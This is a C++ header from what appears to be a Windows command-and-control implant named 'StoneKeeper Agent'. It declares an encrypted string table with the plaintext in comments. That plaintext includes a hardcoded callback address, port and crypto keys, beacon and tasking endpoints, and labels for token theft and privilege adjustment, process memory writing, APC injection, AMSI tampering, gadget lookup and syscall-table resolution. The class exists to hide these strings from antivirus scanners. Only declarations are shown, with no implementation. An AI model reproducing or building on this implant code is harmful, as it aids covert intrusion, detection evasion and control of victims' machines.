#pragma once
#include "SecureString.hpp"
#include <string>

template<typename T> class SecureVector;

class StringCrypt {
public:
    static StringCrypt& Get() {
        static StringCrypt stringCrypt; // Guaranteed to be destroyed and instantiated on first use.
        return stringCrypt;
    }

    // Public members
    // BEGIN DEFINITIONS DON'T REMOVE
    // 127.0.0.1
    static SecureString IP_CRYPT;
    // 6969
    static SecureString PORT_CRYPT;
    // be3856cdcd8e8d4688a4e3256b5349725e6148a815bcf11dc99cbf445fc18f29
    static SecureString AESKEY_CRYPT;
    // 1ae3f18f8dc1bf4ff2b96ec222fc67b90b5f8c1b9c3e6e86300724f6cdef8d62
    static SecureString XORKEY_CRYPT;
    // b6d422ee9783d62acd43b829
    static SecureString IV_CRYPT;
    // StoneKeeper Agent/1.0
    static SecureString USERAGENT_CRYPT;
    // Retrieving module base address
    static SecureString RETRIEVINGMODULEBASEADDRESS_CRYPT;
    //  failed with NTSTATUS code: 0x
    static SecureString NTSTATUSFAIL_CRYPT;
    //  failed with error code: 0x
    static SecureString LASTERRORFAIL_CRYPT;
    //  failed
    static SecureString FAILED_CRYPT;
    // The number in the string is too large for a DWORD.
    static SecureString NUMBERTOOLARGEFORDWORD_CRYPT;
    // ID
    static SecureString ID_CRYPT;
    // Name
    static SecureString NAME_CRYPT;
    // ListenerID
    static SecureString LISTENERID_CRYPT;
    // Sleep
    static SecureString SLEEP_CRYPT;
    // Jitter
    static SecureString JITTER_CRYPT;
    // ExternalIP
    static SecureString EXTERNALIP_CRYPT;
    // InternalIP
    static SecureString INTERNALIP_CRYPT;
    // Time
    static SecureString TIME_CRYPT;
    // Hostname
    static SecureString HOSTNAME_CRYPT;
    // Token
    static SecureString TOKEN_CRYPT;
    // Username
    static SecureString USERNAME_CRYPT;
    // OS
    static SecureString OS_CRYPT;
    // Active
    static SecureString ACTIVE_CRYPT;
    // Timeout reached for task using timeout value
    static SecureString TIMEOUTREACHEDFORTASK_CRYPT;
    // AgentID
    static SecureString AGENTID_CRYPT;
    // Command
    static SecureString COMMAND_CRYPT;
    // Arguments
    static SecureString ARGUMENTS_CRYPT;
    // Timeout
    static SecureString TIMEOUT_CRYPT;
    // Success
    static SecureString SUCCESS_CRYPT;
    // InQueue
    static SecureString INQUEUE_CRYPT;
    // TimedOut
    static SecureString TIMEDOUT_CRYPT;
    // CreateTime
    static SecureString CREATETIME_CRYPT;
    // EndTime
    static SecureString ENDTIME_CRYPT;
    // Result
    static SecureString RESULT_CRYPT;
    // 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
    static SecureString NUMBERSUPPERLOWER_CRYPT;
    // Getting process information
    static SecureString GETTINGPROCESSINFORMATION_CRYPT;
    // Querying thread information
    static SecureString QUERYINGTHREADINFORMATION_CRYPT;
    // Getting system information
    static SecureString GETTINGSYSTEMINFORMATION_CRYPT;
    // Opening process
    static SecureString OPENINGPROCESS_CRYPT;
    // Opening token
    static SecureString OPENINGTOKEN_CRYPT;
    // Duplicating token
    static SecureString DUPLICATINGTOKEN_CRYPT;
    // Setting thread information
    static SecureString SETTINGTHREADINFORMATION_CRYPT;
    // Privilege value lookup
    static SecureString PRIVILEGEVALUELOOKUP_CRYPT;
    // Adjusting token
    static SecureString ADJUSTINGTOKEN_CRYPT;
    // Querying token
    static SecureString QUERYINGTOKEN_CRYPT;
    // SID lookup
    static SecureString SIDLOOKUP_CRYPT;
    // \Registry\Machine\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName
    static SecureString COMPUTERNAMEREGISTRY_CRYPT;
    // ComputerName
    static SecureString COMPUTERNAME_CRYPT;
    // Opening key
    static SecureString OPENINGKEY_CRYPT;
    // Querying key
    static SecureString QUERYINGKEY_CRYPT;
    // \Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    static SecureString CURRENTVERSIONREGISTRY_CRYPT;
    // ProductName
    static SecureString PRODUCTNAME_CRYPT;
    // DisplayVersion
    static SecureString DISPLAYVERSION_CRYPT;
    // CurrentBuild
    static SecureString CURRENTBUILD_CRYPT;
    // LOW
    static SecureString LOW_CRYPT;
    // MEDIUM
    static SecureString MEDIUM_CRYPT;
    // HIGH
    static SecureString HIGH_CRYPT;
    // SYSTEM
    static SecureString SYSTEM_CRYPT;
    // UNKNOWN
    static SecureString UNKNOWN_CRYPT;
    // Queuing APC thread failed
    static SecureString QUEUINGAPCTHREADFAILED_CRYPT;
    // Process:
    static SecureString PROCESSCOLON_CRYPT;
    //  | ID:
    static SecureString PIPEIDCOLON_CRYPT;
    //  | User:
    static SecureString PIPEUSERCOLON_CRYPT;
    //  | Token:
    static SecureString PIPETOKENCOLON_CRYPT;
    // Creating pipe
    static SecureString CREATINGPIPE_CRYPT;
    // Creating process
    static SecureString CREATINGPROCESS_CRYPT;
    // Reading memory
    static SecureString READINGMEMORY_CRYPT;
    // Protecting memory
    static SecureString PROTECTINGMEMORY_CRYPT;
    // Writing memory
    static SecureString WRITINGMEMORY_CRYPT;
    // Out of range error
    static SecureString OUTOFRANGEERROR_CRYPT;
    // Charset is empty.
    static SecureString CHARSETISEMPTY_CRYPT;
    // BIO_new for base64 failed.
    static SecureString BIO_NEWFORBASE64FAILED_CRYPT;
    // BIO_new for memory buffer failed.
    static SecureString BIO_NEWFORMEMORYBUFFERFAILED_CRYPT;
    // BIO_write failed.
    static SecureString BIO_WRITEFAILED_CRYPT;
    // BIO_flush failed.
    static SecureString BIO_FLUSHFAILED_CRYPT;
    // BIO_get_mem_ptr failed.
    static SecureString BIO_GET_MEM_PTRFAILED_CRYPT;
    // BIO_new_mem_buf failed.
    static SecureString BIO_NEW_MEM_BUFFAILED_CRYPT;
    // BIO_read failed.
    static SecureString BIO_READFAILED_CRYPT;
    // Invalid Base64 input length.
    static SecureString INVALIDBASE64INPUTLENGTH_CRYPT;
    // Hex string has odd length
    static SecureString HEXSTRINGHASODDLENGTH_CRYPT;
    // Error generating ChaCha20 key
    static SecureString ERRORGENERATINGCHACHA20KEY_CRYPT;
    // Error generating ChaCha20 nonce
    static SecureString ERRORGENERATINGCHACHA20NONCE_CRYPT;
    // EVP_CIPHER_CTX_new failed.
    static SecureString EVP_CIPHER_CTX_NEWFAILED_CRYPT;
    // ChaCha20 encryption/decryption failed
    static SecureString CHACHA20ENCRYPTIONDECRYPTIONFAILED_CRYPT;
    // ChaCha20 finalization failed
    static SecureString CHACHA20FINALIZATIONFAILED_CRYPT;
    // /register/
    static SecureString REGISTER_CRYPT;
    // /tasks/
    static SecureString TASKS_CRYPT;
    // /error/
    static SecureString ERROR_CRYPT;
    // pWinHttpOpen
    static SecureString PWINHTTPOPEN_CRYPT;
    // pWinHttpConnect
    static SecureString PWINHTTPCONNECT_CRYPT;
    // GET
    static SecureString GET_CRYPT;
    // pWinHttpOpenRequest
    static SecureString PWINHTTPOPENREQUEST_CRYPT;
    // pWinHttpSetOption
    static SecureString PWINHTTPSETOPTION_CRYPT;
    // pWinHttpSendRequest
    static SecureString PWINHTTPSENDREQUEST_CRYPT;
    // pWinHttpReceiveResponse
    static SecureString PWINHTTPRECEIVERESPONSE_CRYPT;
    // pWinHttpQueryHeaders
    static SecureString PWINHTTPQUERYHEADERS_CRYPT;
    // pWinHttpQueryDataAvailable
    static SecureString PWINHTTPQUERYDATAAVAILABLE_CRYPT;
    // pWinHttpReadData
    static SecureString PWINHTTPREADDATA_CRYPT;
    // POST
    static SecureString POST_CRYPT;
    // Failed to resolve VX table
    static SecureString FAILEDTORESOLVEVXTABLE_CRYPT;
    // Failed to resolve Win32 tables
    static SecureString FAILEDTORESOLVEWIN32TABLES_CRYPT;
    // Max retries reached
    static SecureString MAXRETRIESREACHED_CRYPT;
    // Secure Exception:
    static SecureString SECUREEXCEPTION_CRYPT;
    // Unknown Exception occurred.
    static SecureString UNKNOWNEXCEPTIONOCCURRED_CRYPT;
    // Invalid DOS signature
    static SecureString INVALIDDOSSIGNATURE_CRYPT;
    // Invalid NT signature
    static SecureString INVALIDNTSIGNATURE_CRYPT;
    // .text
    static SecureString TEXT_CRYPT;
    // Getting named object directory
    static SecureString GETTINGNAMEDOBJECTDIRECTORY_CRYPT;
    // Creating timer
    static SecureString CREATINGTIMER_CRYPT;
    // Setting timer
    static SecureString SETTINGTIMER_CRYPT;
    // .reloc
    static SecureString RELOC_CRYPT;
    // Creating timers
    static SecureString CREATINGTIMERS_CRYPT;
    // Failed to find gadgets
    static SecureString FAILEDTOFINDGADGETS_CRYPT;
    // Opening thread
    static SecureString OPENINGTHREAD_CRYPT;
    // Suspending thread
    static SecureString SUSPENDINGTHREAD_CRYPT;
    // Resuming thread
    static SecureString RESUMINGTHREAD_CRYPT;
    // Finding func
    static SecureString FINDINGFUNC_CRYPT;
    // amsi.dll
    static SecureString AMSIDLL_CRYPT;
    // Loading DLL
    static SecureString LOADINGDLL_CRYPT;
    // Retrieving headers
    static SecureString RETRIEVINGHEADERS_CRYPT;
    // Opening image
    static SecureString OPENINGIMAGE_CRYPT;
    // Querying file info
    static SecureString QUERYINGFILEINFO_CRYPT;
    // Reading image
    static SecureString READINGIMAGE_CRYPT;
    // kernel32.dll
    static SecureString KERNEL32DLL_CRYPT;
    // advapi32.dll
    static SecureString ADVAPI32DLL_CRYPT;
    // crypt32.dll
    static SecureString CRYPT32DLL_CRYPT;
    // user32.dll
    static SecureString USER32DLL_CRYPT;
    // shell32.dll
    static SecureString SHELL32DLL_CRYPT;
    // winhttp.dll
    static SecureString WINHTTPDLL_CRYPT;
    // mscoree.dll
    static SecureString MSCOREEDLL_CRYPT;
    // oleaut32.dll
    static SecureString OLEAUT32DLL_CRYPT;
    // ws2_32.dll
    static SecureString WS2_32DLL_CRYPT;
    // kernelbase.dll
    static SecureString KERNELBASEDLL_CRYPT;
    // cryptsp.dll
    static SecureString CRYPTSPDLL_CRYPT;
    // iphlpapi.dll
    static SecureString IPHLPAPIDLL_CRYPT;
    // Initializing critical section
    static SecureString INITIALIZINGCRITICALSECTION_CRYPT;
    // Allocating memory
    static SecureString ALLOCATINGMEMORY_CRYPT;
    // "ID":
    static SecureString IDJSONPATTERN_CRYPT;
    // "AgentID":
    static SecureString AGENTIDJSONPATTERN_CRYPT;
    // "Timeout":
    static SecureString TIMEOUTJSONPATTERN_CRYPT;
    // "Active":
    static SecureString ACTIVEJSONPATTERN_CRYPT;
    // "Success":
    static SecureString SUCCESSJSONPATTERN_CRYPT;
    // "InQueue":
    static SecureString INQUEUEJSONPATTERN_CRYPT;
    // "TimedOut":
    static SecureString TIMEDOUTJSONPATTERN_CRYPT;
    // true
    static SecureString TRUEJSONPATTERN_CRYPT;
    // "Command":
    static SecureString COMMANDJSONPATTERN_CRYPT;
    // "CreateTime":
    static SecureString CREATETIMEJSONPATTERN_CRYPT;
    // "EndTime":
    static SecureString ENDTIMEJSONPATTERN_CRYPT;
    // "Result":
    static SecureString RESULTJSONPATTERN_CRYPT;
    // "Arguments":
    static SecureString ARGUMENTSJSONPATTERN_CRYPT;
    // Null pointer passed to SecureString constructor
    static SecureString NULLPOINTERPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT;
    // Null pointer passed to SecureString::assign
    static SecureString NULLPOINTERPASSEDTOSECURESTRINGASSIGN_CRYPT;
    // Empty range passed to SecureString constructor
    static SecureString EMPTYRANGEPASSEDTOSECURESTRINGCONSTRUCTOR_CRYPT;
    // Empty range passed to SecureString::assign
    static SecureString EMPTYRANGEPASSEDTOSECURESTRINGASSIGN_CRYPT;
    // Random bytes generation error
    static SecureString RANDOMBYTESGENERATIONERROR_CRYPT;
    // Invalid hex character
    static SecureString INVALIDHEXCHARACTER_CRYPT;
    // Index out of range
    static SecureString INDEXOUTOFRANGE_CRYPT;
    // Null pointer passed to SecureWideString constructor
    static SecureString NULLPOINTERPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT;
    // Empty range passed to SecureWideString constructor
    static SecureString EMPTYRANGEPASSEDTOSECUREWIDESTRINGCONSTRUCTOR_CRYPT;
    // Empty range passed to SecureWideString::append
    static SecureString EMPTYRANGEPASSEDTOSECUREWIDESTRINGAPPEND_CRYPT;
    // Creating event
    static SecureString CREATINGEVENT_CRYPT;
    // Allocating a new thread pool
    static SecureString ALLOCATINGANEWTHREADPOOL_CRYPT;
    // Setting the minimum number of threads for the pool
    static SecureString SETTINGTHEMINIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT;
    // Setting the maximum number of threads for the pool
    static SecureString SETTINGTHEMAXIMUMNUMBEROFTHREADSFORTHEPOOL_CRYPT;
    // Allocating a work item
    static SecureString ALLOCATINGAWORKITEM_CRYPT;
    // Posting the work item to the thread pool
    static SecureString POSTINGTHEWORKITEMTOTHETHREADPOOL_CRYPT;
    // NONE
    static SecureString NONE_CRYPT;
    // OTHER
    static SecureString OTHER_CRYPT;
    // TEREDO
    static SecureString TEREDO_CRYPT;
    // IPHTTPS
    static SecureString IPHTTPS_CRYPT;
    // ISATAP
    static SecureString ISATAP_CRYPT;
    // 6TO4
    static SecureString SIXTOFOUR_CRYPT;
    // DIRECT
    static SecureString DIRECT_CRYPT;
    // Other
    static SecureString OTHER_CAP_CRYPT;
    // Ethernet
    static SecureString ETHERNET_CRYPT;
    // Token Ring
    static SecureString TOKENRING_CRYPT;
    // PPP
    static SecureString PPP_CRYPT;
    // Loopback
    static SecureString LOOPBACK_CRYPT;
    // ATM
    static SecureString ATM_CRYPT;
    // Virtual (VPN)
    static SecureString VIRTUAL_VPN_CRYPT;
    // IEEE 802.11 Wireless
    static SecureString IEEE802_11WIRELESS_CRYPT;
    // Tunnel
    static SecureString TUNNEL_CRYPT;
    // IEEE 1394
    static SecureString IEEE1394_CRYPT;
    // WWANPP
    static SecureString WWANPP_CRYPT;
    // WWANPP2
    static SecureString WWANPP2_CRYPT;
    // Unknown
    static SecureString UNKNOWN_CAP_CRYPT;
    // Up
    static SecureString UP_CAP_CRYPT;
    // Down
    static SecureString DOWN_CAP_CRYPT;
    //  Mbps
    static SecureString SPACE_MBPS_CRYPT;
    //  Gbps
    static SecureString SPACE_GBPS_CRYPT;
    // N/A
    static SecureString N_SLASH_A_CRYPT;
    // True
    static SecureString TRUE_CAP_CRYPT;
    // False
    static SecureString FALSE_CAP_CRYPT;
    // Adapter Name:
    static SecureString ADAPTERNAMECOLON_CRYPT;
    // Adapter Description:
    static SecureString ADAPTERDESCRIPTIONCOLON_CRYPT;
    // MAC Address:
    static SecureString MACADDRESSCOLON_CRYPT;
    // DNS Suffix:
    static SecureString DNSSUFFIXCOLON_CRYPT;
    // Operational Status:
    static SecureString OPERATIONALSTATUSCOLON_CRYPT;
    // Adapter Type:
    static SecureString ADAPTERTYPECOLON_CRYPT;
    // Tunnel Type:
    static SecureString TUNNELTYPECOLON_CRYPT;
    // DHCPv4 Server:
    static SecureString DHCPV4SERVERCOLON_CRYPT;
    // DHCPv6 Server:
    static SecureString DHCPV6SERVERCOLON_CRYPT;
    // Transmit Link Speed:
    static SecureString TRANSMITLINKSPEEDCOLON_CRYPT;
    // Receive Link Speed:
    static SecureString RECEIVELINKSPEEDCOLON_CRYPT;
    // Additional DNS Suffix:
    static SecureString ADDITIONALDNSSUFFIXCOLON_CRYPT;
    // IP Address:
    static SecureString IPADDRESSCOLON_CRYPT;
    // DNS Server:
    static SecureString DNSSERVERCOLON_CRYPT;
    // WINS Server:
    static SecureString WINSSERVERCOLON_CRYPT;
    // Gateway Address:
    static SecureString GATEWAYADDRESSCOLON_CRYPT;
    // DDNS Enabled:
    static SecureString DDNSENABLEDCOLON_CRYPT;
    // Register Adapter Suffix:
    static SecureString REGISTERADAPTERSUFFIXCOLON_CRYPT;
    // DHCPv4 Enabled:
    static SecureString DHCPV4ENABLEDCOLON_CRYPT;
    // Receive Only:
    static SecureString RECEIVEONLYCOLON_CRYPT;
    // No Multicast:
    static SecureString NOMULTICASTCOLON_CRYPT;
    // IPv6 Other Stateful Config:
    static SecureString IPV6OTHERSTATEFULCONFIGCOLON_CRYPT;
    // NetBIOS Over TCP/IP Enabled:
    static SecureString NETBIOSOVERTCPIPENABLEDCOLON_CRYPT;
    // IPv4 Enabled:
    static SecureString IPV4ENABLEDCOLON_CRYPT;
    // IPv6 Enabled:
    static SecureString IPV6ENABLEDCOLON_CRYPT;
    // IPv6 Managed Address Config:
    static SecureString IPV6MANAGEDADDRESSCONFIGCOLON_CRYPT;
    // Getting adapter addresses
    static SecureString GETTINGADAPTERADDRESSES_CRYPT;
    // END DEFINITIONS DON'T REMOVE

    // Public methods
    static SecureString DecryptString(SecureString str);

    // Delete copy/move constructors and assignment operators
    StringCrypt(StringCrypt const&) = delete;
    void operator=(StringCrypt const&) = delete;
    StringCrypt(StringCrypt&&) = delete;
    void operator=(StringCrypt&&) = delete;

private:
    StringCrypt();

    // Private methods

    // Private members
    static SecureVector<unsigned char> Key;
    static SecureVector<unsigned char> IV;
};
